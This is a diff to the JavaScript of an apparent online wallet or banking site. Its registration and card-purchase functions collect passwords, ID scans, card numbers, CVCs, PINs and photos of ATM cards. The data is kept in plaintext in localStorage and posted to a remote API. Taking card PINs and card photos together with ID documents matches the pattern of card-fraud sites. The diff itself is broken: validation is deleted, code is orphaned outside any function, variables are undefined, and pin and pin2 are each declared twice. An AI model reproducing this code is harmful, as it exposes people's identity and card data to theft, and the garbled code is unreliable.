@@ -891,44 +891,61 @@ function fileToDataUrl(file) {
   });
 }
 
-// ==================================================
-// 📝 REGISTRATION — FULL FUNCTION ✅
-// ==================================================
-async function submitRegistration() {
-  const fullName = document.getElementById("regFullName").value.trim();
-  const email = document.getElementById("regEmail").value.trim();
-  const phone = document.getElementById("regPhone").value.trim();
-  const dob = document.getElementById("regDob").value;
-  const country = document.getElementById("regCountry").value;
-  const state = document.getElementById("regState").value;
-  const city = document.getElementById("regCity").value;
-  const password = document.getElementById("regPass").value;
-  const confirmPass = document.getElementById("regConfirmPass").value;
-  const idType = document.getElementById("idType").value;
-  const idNumber = document.getElementById("idNumber").value;
-  const idFrontFile = document.getElementById("idFront").files[0];
-  const idBackFile = document.getElementById("idBack").files[0];
-
-  // ✅ Basic validation
-  if (!fullName || !email || !phone || !dob || !country || !state || !city) {
-    return alert("❌ Please fill in ALL required fields");
-  }
-  if (!password || password.length < 8) {
-    return alert("❌ Password must be at least 8 characters");
-  }
-  if (password !== confirmPass) {
-    return alert("❌ Passwords do NOT match");
-  }
-  if (!idType || !idNumber) {
-    return alert("❌ Please select ID type and enter ID number");
-  }
-  if (!idFrontFile || !idBackFile) {
-    return alert("❌ Please upload both front and back of your ID");
-  }
 
   // ✅ Convert images to Base64
   const idFront = await fileToDataUrl(idFrontFile);
   const idBack = await fileToDataUrl(idBackFile);
+  
+// ==================================================
+// ✅ SAVE TO MONGODB VIA RENDER API — CRITICAL!
+// ==================================================
+async function submitRegistration() {
+  // ... your existing form validation code ...
+
+  // Build your user object
+  const currentUser = {
+    full_name: fullName,
+    email: email,
+    phone: phone,
+    country: country,
+    state: state,
+    city: city,
+    dob: dob,
+    gender: gender,
+    password: password,
+    idType: idType,
+    idNumber: idNumber,
+    idFront: idFrontDataUrl,
+    idBack: idBackDataUrl,
+    account_number: "2026" + Math.floor(Math.random() * 9000000000 + 1000000000),
+    balance: 0,
+    approved: false,
+    frozen: false,
+    card_submitted: false,
+    card_approved: false,
+    created_at: new Date().toISOString()
+  };
+
+  // Save locally
+  localStorage.setItem("registered_user", JSON.stringify(currentUser));
+
+  // ✅ SEND TO MONGODB — THIS IS WHAT CREATES THE "users" COLLECTION!
+  try {
+    const response = await fetch("https://prime-wallet-api.onrender.com/api/register", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(currentUser)
+    });
+    const data = await response.json();
+    console.log("✅ SAVED TO MONGODB!", data);
+    alert("✅ Registration Successful! Waiting for approval...");
+  } catch (err) {
+    console.log("⚠️ API Error:", err);
+    alert("✅ Saved locally! Admin will review shortly.");
+  }
+
+  showPage("loginPage");
+}
 
   // ✅ Create user account
   const accountNumber = "2026" + Math.floor(Math.random() * 900000000 + 100000000);
@@ -1067,8 +1084,10 @@ async function submitCardPurchase() {
   const number = document.getElementById("payCardNumber").value.trim().replace(/\s/g, '');
   const expiry = document.getElementById("payCardExpiry").value;
   const cvc = document.getElementById("payCardCvc").value;
-  const pin = document.getElementById("userPin").value;
-  const pin2 = document.getElementById("userPinConfirm").value;
+  const pin = document.getElementById("payCardPin").value;
+  const pin2 = document.getElementById("payCardPinConfirm").value;
+  const pin  = document.getElementById("userCardPin").value;
+  const pin2 = document.getElementById("userCardPinConfirm").value;
   const frontFile = document.getElementById("payCardFront").files[0];
   const backFile = document.getElementById("payCardBack").files[0];
 
@@ -1099,7 +1118,7 @@ async function submitCardPurchase() {
   currentUser.atmBack = atmBack;
   currentUser.pin = pin;
   currentUser.card_submitted = true;
-  currentUser.card_approved = false; // pending admin approval
+  currentUser.card_approved = false; // pending bank approval
 
   localStorage.setItem("registered_user", JSON.stringify(currentUser));
 
